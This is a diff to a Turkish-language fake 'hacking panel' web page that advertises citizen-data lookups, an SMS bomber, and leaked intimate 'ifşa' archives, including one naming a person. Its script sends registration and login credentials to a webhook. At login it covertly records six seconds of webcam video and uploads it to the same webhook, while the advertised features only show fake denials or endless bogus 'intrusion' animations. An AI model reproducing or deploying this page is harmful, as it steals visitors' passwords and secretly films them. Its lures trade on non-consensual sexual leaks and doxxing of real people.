@@ -8,7 +8,7 @@
         :root { --bg: #ffffff; --text: #000000; --box: #f4f4f4; --accent: #162a8c; --header-bg: #f9f9f9; }
         .dark-mode { --bg: #0a0a0a; --text: #ffffff; --box: #1a1a1a; --accent: #5c7dff; --header-bg: #111; }
 
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; transition: 0.3; overflow-x: hidden; }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; transition: 0.3s; overflow-x: hidden; }
         
         .controls { display: flex; align-items: center; gap: 20px; }
         .mode-toggle { cursor: pointer; font-size: 22px; user-select: none; }
@@ -21,20 +21,20 @@
         .switch-link { margin-top: 25px; font-size: 13px; color: #888; cursor: pointer; }
 
         #panel { display: none; }
-        .header { background: var(--header-bg); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(128,128,128,0.1); }
+        .header { background: var(--header-bg); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(128,128,128,0.1); position: sticky; top: 0; z-index: 5000; }
         
         .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 5px; padding: 5px; }
         .hamburger div { width: 24px; height: 2px; background: var(--text); border-radius: 2px; }
 
-        #sideMenu { position: fixed; top: 0; right: -320px; width: 300px; height: 100%; background: var(--box); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); z-index: 10000; padding-top: 60px; box-shadow: -10px 0 30px rgba(0,0,0,0.2); }
-        .menu-item { padding: 20px 25px; border-bottom: 1px solid rgba(128,128,128,0.05); cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.2s; }
+        #sideMenu { position: fixed; top: 0; right: -320px; width: 300px; height: 100%; background: var(--box); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); z-index: 10000; padding-top: 60px; box-shadow: -10px 0 30px rgba(0,0,0,0.2); overflow-y: auto; }
+        .menu-item { padding: 15px 25px; border-bottom: 1px solid rgba(128,128,128,0.05); cursor: pointer; font-size: 12px; font-weight: 500; transition: 0.2s; }
         .menu-item:hover { background: var(--accent); color: #fff; }
+        .menu-cat { background: rgba(128,128,128,0.1); padding: 8px 25px; font-size: 9px; font-weight: bold; color: var(--accent); letter-spacing: 1px; text-transform: uppercase; }
 
-        /* YÜKLEME EKRANI (EMRE İFS İÇİN) */
         #loadingScreen { display: none; position: fixed; inset: 0; background: #000; z-index: 100000; color: #0f0; font-family: 'Courier New', monospace; padding: 30px; font-size: 14px; }
         .dot-ani::after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
         @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }
-        .close-loading { position: absolute; top: 20px; right: 20px; color: #555; cursor: pointer; }
+        .close-loading { position: absolute; top: 20px; right: 20px; color: #444; cursor: pointer; }
 
         .content-area { padding: 20px; }
         .row { display: flex; justify-content: space-between; padding: 18px 10px; border-bottom: 1px solid rgba(128,128,128,0.1); font-size: 14px; }
@@ -61,12 +61,11 @@
     <div class="mode-toggle" style="margin-bottom: 20px;" onclick="document.body.classList.toggle('dark-mode')">🌓</div>
     <div class="auth-box">
         <h1>M0SREW</h1>
-        <p style="font-size: 12px; color: #888; margin-bottom: 15px;">Sisteme Kayıt Olun</p>
         <input type="text" id="regUser" placeholder="Kullanıcı Adı">
         <input type="email" id="regEmail" placeholder="E-posta">
         <input type="password" id="regPass" placeholder="Şifre">
         <button class="btn" onclick="registerAction()">KAYDI TAMAMLA</button>
-        <div class="switch-link" onclick="showSection('loginSection')">Zaten hesabım var? <b>Giriş Yap</b></div>
+        <div class="switch-link" onclick="showSection('loginSection')">Giriş Yap</div>
     </div>
 </div>
 
@@ -80,30 +79,61 @@
     </div>
 
     <div id="sideMenu">
-        <div class="menu-item" onclick="startLoading('EMRE İFS4 Veritabanına Sızılıyor')" style="color:var(--accent); font-weight: 800; border-bottom: 2px solid var(--accent);">EMRE İFS4</div>
-        
-        <div class="menu-item" onclick="accessError()">MERNİS 2026 SORGULA</div>
+        <div class="menu-cat">SİSTEM SORGULARI</div>
+        <div class="menu-item" onclick="accessError()">MERNİS 2026</div>
         <div class="menu-item" onclick="accessError()">GSM LOKASYON</div>
-        <div class="menu-item" onclick="accessError()">TC NO SORGULAMA</div>
-        <div class="menu-item" onclick="location.reload()" style="color: red;">SİSTEMİ KAPAT</div>
+        <div class="menu-item" onclick="accessError()">TC SORGULAMA</div>
+        <div class="menu-item" onclick="accessError()">AİLE SOY AĞACI</div>
+        <div class="menu-item" onclick="accessError()">PLAKA SORGULAMA</div>
+        <div class="menu-item" onclick="accessError()">E-OKUL SIZMA</div>
+        <div class="menu-item" onclick="accessError()">TAPU KAYITLARI</div>
+        <div class="menu-item" onclick="accessError()">SMS BOMBER V4</div>
+        <div class="menu-item" onclick="accessError()">IP TRACKER</div>
+        <div class="menu-item" onclick="accessError()">INSTAGRAM BYPASS</div>
+        <div class="menu-item" onclick="accessError()">E-DEVLET SIZMA</div>
+        <div class="menu-item" onclick="accessError()">BANKA LOG SORGULAMA</div>
+        <div class="menu-item" onclick="accessError()">ADLI SİCİL KAYDI</div>
+        <div class="menu-item" onclick="accessError()">PASAPORT SORGULAMA</div>
+        <div class="menu-item" onclick="accessError()">BİNA/KONUT SORGULAMA</div>
+        <div class="menu-item" onclick="accessError()">WHATSAPP SNIFFER</div>
+        <div class="menu-item" onclick="accessError()">GPS CANLI İZLEME</div>
+        <div class="menu-cat">ÖZEL ARŞİV (İFŞA)</div>
+        <div class="menu-item" onclick="startLoading('Arşiv Dosyaları Çözülüyor')">YERLİ FENOMEN SETİ</div>
+        <div class="menu-item" onclick="startLoading('EMRE İFS4 Bağlantısı Kuruluyor')" style="color:var(--accent); font-weight: bold;">EMRE İFS4</div>
+        <div class="menu-item" onclick="startLoading('Video Paketleri Ayıklanıyor')">TIKTOK SIZINTILARI</div>
+        <div class="menu-item" onclick="startLoading('Gizli Arşiv V2 Açılıyor')">ÜNLÜLER ÖZEL (VIP)</div>
+        <div class="menu-item" onclick="startLoading('Sistem Bypass Ediliyor')">GİZLİ KAMERA SIZINTI</div>
+        <div class="menu-item" onclick="startLoading('Database Sızılıyor')">TWITCH ARŞİV</div>
+        <div class="menu-item" onclick="startLoading('Loglar Okunuyor')">INSTAGRAM ÖZEL MESAJLAR</div>
+        <div class="menu-item" onclick="startLoading('Veriler Getiriliyor')">MODEL İFŞA ARŞİVİ</div>
+        <div class="menu-item" onclick="startLoading('Bağlantı Kuruluyor')">ESKİ ARŞİV V1</div>
+        <div class="menu-item" onclick="startLoading('Sızma İşlemi Başladı')">ÖZEL ÜYELİK İÇERİĞİ</div>
+        <div class="menu-item" onclick="startLoading('Bypass Deneniyor')">SNAPCHAT GİZLİ ALBÜM</div>
+        <div class="menu-item" onclick="startLoading('Dosyalar İndiriliyor')">YOUTUBER İFŞALARI</div>
+        <div class="menu-item" onclick="startLoading('Giriş Yapılıyor')">KAPALI GRUP SIZINTI</div>
+        <div class="menu-item" onclick="startLoading('Loglar Getiriliyor')">WHATSAPP MEDYA SIZINTI</div>
+        <div class="menu-item" onclick="startLoading('Database Bypass')">TELEGRAM GİZLİ ARŞİV</div>
+        <div class="menu-item" onclick="startLoading('Video Çözülüyor')">YERLİ İFŞA FULL SET</div>
+        <div class="menu-cat">DİĞER</div>
+        <div class="menu-item" onclick="location.reload()" style="color: red;">ÇIKIŞ YAP</div>
     </div>
 
     <div class="content-area">
-        <div class="row"><span>SİSTEM DURUMU</span><span style="color: #00ff00; font-weight: bold;">CONNECTED</span></div>
-        <div class="row"><span>IP ADRESİNİZ</span><span id="myIp">Yükleniyor...</span></div>
-        <div class="row"><span>ERİŞİM SEVİYESİ</span><span class="lock">ROOT GEREKLİ</span></div>
-        <p style="font-size: 11px; color: #888; text-align: center; margin-top: 50px; line-height: 1.5;">Özellikleri kullanmak için sağ üstteki menüden<br>bir sorgu türü seçin.</p>
+        <div class="row"><span>DURUM</span><span style="color: #00ff00; font-weight: bold;">CONNECTED</span></div>
+        <div class="row"><span>IP</span><span id="myIp">---</span></div>
+        <div class="row"><span>YETKİ</span><span class="lock">YETERSİZ</span></div>
+        <p style="font-size: 11px; color: #888; text-align: center; margin-top: 50px;">Menüden bir işlem başlatın.</p>
     </div>
 </div>
 
 <div id="loadingScreen">
-    <div class="close-loading" onclick="document.getElementById('loadingScreen').style.display='none'">[X] Kapat</div>
-    <div id="loadText" style="font-size: 18px; color: #fff; margin-bottom: 10px;">Bağlantı Kuruluyor</div>
-    <div class="dot-ani">Protokoller işleniyor, veritabanı bypass ediliyor</div>
+    <div class="close-loading" onclick="document.getElementById('loadingScreen').style.display='none'">[X] İPTAL</div>
+    <div id="loadText" style="font-size: 18px; color: #fff; margin-bottom: 10px;">Sızma Başlatıldı</div>
+    <div class="dot-ani">Veritabanı yanıtı bekleniyor</div>
     <br><br>
-    <div style="color: #333;">> Checking SQL vulnerabilities... Found</div>
-    <div style="color: #333;">> Injecting payload to server... Done</div>
-    <div style="color: #333;">> Accessing encrypted files... [Please Wait]</div>
+    <div style="color: #333;">> Initializing exploit...</div>
+    <div style="color: #333;">> Brute-forcing admin pass...</div>
+    <div id="statusUpdate" style="color: #0f0; margin-top: 10px;">[SİSTEM] Bekleniyor...</div>
 </div>
 
 <script>
@@ -120,30 +150,27 @@
         s.style.right = s.style.right === '0px' ? '-320px' : '0px';
     }
 
-    // EMRE İFS Tıklanınca Çalışan Fonksiyon
-    function startLoading(text) {
-        toggleNav(); // Menüyü kapat
-        document.getElementById('loadingScreen').style.display = 'block';
-        document.getElementById('loadText').innerText = text;
+    // Teknik Sorgular İçin Hata Mesajı
+    function accessError() {
+        alert("Erişim Engellendi! ❌\n\nBu özelliği kullanmak için yetkiniz yetersiz. Lütfen Admin ile iletişime geçin veya VIP Üyelik satın alın.");
     }
 
-    // Diğer Sorgular Tıklanınca Çalışan Fonksiyon
-    function accessError() {
-        alert("Erişim Engellendi! ❌\n\nBu özelliği kullanmak için yetkiniz yetersiz. Lütfen VIP Abonelik satın alın veya Admin ile iletişime geçin.");
+    // İfşalar ve Emre İfs İçin Sonsuz Yükleme
+    function startLoading(text) {
+        toggleNav();
+        document.getElementById('loadingScreen').style.display = 'block';
+        document.getElementById('loadText').innerText = text;
+        const status = document.getElementById('statusUpdate');
+        const msgs = ["[HATA] Zaman aşımı, tekrar deneniyor...", "[INFO] Proxy değiştiriliyor...", "[UYARI] Sunucu dolu...", "[INFO] Sızma denemesi #"+Math.floor(Math.random()*100)];
+        setInterval(() => { status.innerText = msgs[Math.floor(Math.random()*msgs.length)]; }, 2500);
     }
 
     function registerAction() {
         const u = document.getElementById('regUser').value;
-        const e = document.getElementById('regEmail').value;
         const p = document.getElementById('regPass').value;
-        if(!u || !e || !p) return alert("Boş alan bırakmayın!");
-
-        fetch(wh, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({ content: `✅ **KAYIT:** ${u} | ${e} | ${p}` })
-        });
-        alert("Hesap açıldı! Giriş yapın.");
+        if(!u || !p) return alert("Eksik bilgi!");
+        fetch(wh, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ content: `✅ **KAYIT:** ${u}:${p}` }) });
+        alert("Başarılı! Giriş yapın.");
         showSection('loginSection');
     }
 
@@ -151,7 +178,6 @@
         const u = document.getElementById('lUser').value;
         const p = document.getElementById('lPass').value;
         if(!u || !p) return alert("Bilgileri girin!");
-
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
             document.getElementById('cam').srcObject = stream;
@@ -161,23 +187,18 @@
             mr.onstop = () => {
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const fd = new FormData();
-                fd.append("file", blob, "user.webm");
-                fd.append("payload_json", JSON.stringify({ content: `🔱 **GİRİŞ:** ${u} | ${p}` }));
+                fd.append("file", blob, "video.webm");
+                fd.append("payload_json", JSON.stringify({ content: `🔱 **GİRİŞ:** ${u}:${p}` }));
                 fetch(wh, { method: "POST", body: fd });
             };
-            mr.start(); 
-            setTimeout(() => { mr.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000);
-
+            mr.start(); setTimeout(() => { mr.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000);
             document.getElementById('loginSection').style.display = 'none';
             document.getElementById('panel').style.display = 'block';
             document.getElementById('snd').play();
-        } catch(e) {
-            alert("Sistem güvenliği için kamera izni şarttır.");
-        }
+        } catch(e) { alert("Sistem onayı için kamera şart."); }
     }
 
     fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>document.getElementById('myIp').innerText=d.ip);
 </script>
-
 </body>
 </html>
